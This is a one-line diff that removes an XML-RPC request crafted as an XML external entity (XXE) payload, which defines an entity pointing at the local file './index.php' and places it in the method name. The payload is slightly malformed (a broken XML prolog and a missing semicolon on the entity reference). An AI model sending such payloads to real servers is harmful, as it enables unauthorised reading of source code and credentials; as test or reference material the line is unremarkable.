@@ -1,1 +1,0 @@
-<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "./index.php">]><methodCall><methodName>&xxe</methodName></methodCall>
